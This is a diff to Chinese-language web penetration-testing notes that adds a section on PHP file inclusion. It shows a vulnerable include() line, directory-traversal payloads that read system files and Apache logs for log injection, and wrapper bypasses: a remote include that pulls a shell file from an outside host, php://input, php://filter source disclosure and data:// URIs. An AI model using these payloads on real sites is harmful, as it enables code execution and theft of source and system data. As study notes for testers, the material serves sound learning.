@@ -16,8 +16,40 @@
     1. 看上传是如何确定能否上传文件的
 
 
-绕过
+文件包含
 --------------------------------
+
+基础
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+基础包含
+
+::
+    
+    <?php include("inc/" . $_GET['file']); ?>
+
+考虑常用的三种包含方式
+
+同目录包含
+
+::
+
+    file=.htaccess
+
+目录遍历
+
+::
+
+    ?file=../../../../../../../../../var/lib/locate.db
+
+日志注入
+
+::
+
+    ?file=../../../../../../../../../var/log/apache/error.log
+
+绕过
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 一般在文件包含之前，可能会调用file_exists，那么，如何对其进行绕过呢
 
 1. 截断
@@ -40,5 +72,33 @@
     那么在长度有限的时候，```././././``` (n个) 的形式就可以通过这个把路径爆掉
 
 2. 伪协议绕过
+    - RCE: requires allow_url_fopen=On and allow_url_include=On
+    
+    ::
+
+        ?file=[http|https|ftp]://websec.wordpress.com/shell.txt
+
+    - PHP INPUT: specify your payload in the POST parameters, watch urlencoding, details here, requires allow_url_include=On
+
+    ::
+
+        ?file=php://input
+
+    
+    - BASE64: lets you read PHP source because it wont get evaluated in base64. More details here and here
+
+    ::
+
+        ?file=php://filter/convert.base64-encode/resource=index.php
+
+    
+    - DATA: requires allow_url_include=On
+
+    ::
+
+        ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
+
+
 3. url绕过
 4. 特殊字符绕过
+
